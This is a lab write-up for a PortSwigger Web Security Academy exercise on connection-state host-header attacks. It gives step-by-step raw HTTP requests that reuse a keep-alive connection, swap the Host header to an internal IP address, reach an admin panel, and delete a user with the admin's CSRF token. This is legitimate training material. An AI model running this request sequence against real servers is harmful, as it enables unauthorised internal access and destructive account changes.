## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/6899ea11-1c92-4caf-9819-8f61fb385738)

## Overview :

- For performance reasons, **many websites reuse connections for multiple request/response cycles with the same client**. Poorly implemented HTTP servers sometimes work on the dangerous assumption that certain properties, such as the H**ost header, are identical for all HTTP/1.1 requests sent over the same connection**. This may be true of requests sent by a browser, but isn't necessarily the case for a sequence of requests sent from Burp Repeater. This can lead to a number of potential issues.

- For example, you may occasionally encounter servers that only perform thorough validation on the first request they receive over a new connection. In this case, you can potentially bypass this validation by sending an innocent-looking initial request then following up with your malicious one down the same connection. 

- Many reverse proxies use the Host header to route requests to the correct back-end. *If they assume that all requests on the connection are intended for the same host as the initial request, this can provide a useful vector for a number of Host header attacks, including routing-based SSRF, password reset poisoning, and cache poisoning*.
  
## Solution :

Send the **GET /** request to repeater. Notice that it uses **HTTP /1.1**.

> `HTTP /1.1` is vulnerable to connection state attacks.Which means that **the server assumes the Host header are identical for all HTTP/1.1 requests sent over the same connection.**
```HTTP
GET / HTTP/1.1
Host: 0ac90054049021528249292600f20060.h1-web-security-academy.net
Cookie: session=Z4ko94GA9SXTJrq89cILbwmRk7myCkNN; _lab=46%7cMCwCFHrCbsCALhmhjiQlGnm38cMVsREQAhQhfSy1AZghqZBthgiDpr68DLfLiypxKYLx90JCV0kTLtyEtDG4yxfuSUEu52bZ6W1Rv3ZUcn3GcLy%2b9GHILN0rLuWPOdmq8YOZXRkcaumDkD009VBluHpx9BjvB1DbzTUbSCQkRjrm7eomdhs%3d
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portswigger.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

### Connection reuse attack -


**Steps -**

- Send the same request 2 times to repeater tab.
- **Add both the request tabs to a single group.**
- Click on the dropdown near the request group tab & enable `Send group in sequence (single connection)`.
  ![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/f487e6a2-8794-4d26-a173-d48d107b0667)



1. Change the `Connection:` header from **close** to **keep-alive**
```http
GET / HTTP/1.1
Host: 0ac90054049021528249292600f20060.h1-web-security-academy.net

Connection: keep-alive
```
2.  Click on the settings near the send button & enable **Enable HTTP /1 connection reuse** option.
   ![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/173e9ba2-ee96-4dc3-988f-0e867482d385)

3. In request 1 tab ,send the request for the first time to establish connection.
   ![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/1364f3a9-1265-4dff-906d-0180688e6c25)

4. In request 2, change the `Host:` header from **websecurity.net** to **192.168.0.1**. Here we are abusing the connection reuse attack/connection state attack in _HTTP 1.1_. The server/reverse-proxy assumes that after the first connection , all the requests which are of the same connection will have the same host header. We exploit this to access the internal sites.
   ![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/dec0a87b-a042-4f2a-b79b-eb103a6c739b)

Now we can see that we're redirected to the admin panel.

Now again initiate a request using the original request. Then change the header to 192.168.0.1 & change the url header to */admin*.

**Request -**
```http
GET /admin HTTP/1.1
Host: 192.168.0.1

Connection: keep-alive
```

In the response , we get an form with a _POST_ request to `/admin/delete` endpoint in the admin panel along with the csrf token of admin to delete any user.

```html
<form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
                        <input required type="hidden" name="csrf" value="Izf3uvXpYRgLnojzDY7iupMYymW8pBhE">
                        <label>Username</label>
                        <input required type='text' name='username'>
                        <button class='button' type='submit'>Delete user</button>
</form>
```

So send the following POST request to delete the user carlos.

```http
POST /admin/delete HTTP/1.1
Host: 192.168.0.1
Cookie: session=Z4ko94GA9SXTJrq89cILbwmRk7myCkNN; _lab=46%7cMCwCFHrCbsCALhmhjiQlGnm38cMVsREQAhQhfSy1AZghqZBthgiDpr68DLfLiypxKYLx90JCV0kTLtyEtDG4yxfuSUEu52bZ6W1Rv3ZUcn3GcLy%2b9GHILN0rLuWPOdmq8YOZXRkcaumDkD009VBluHpx9BjvB1DbzTUbSCQkRjrm7eomdhs%3d
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portswigger.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

username=carlos&csrf=Izf3uvXpYRgLnojzDY7iupMYymW8pBhE
```
![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/d54c9b78-a5d5-4f89-ae2b-84ab151f2346)
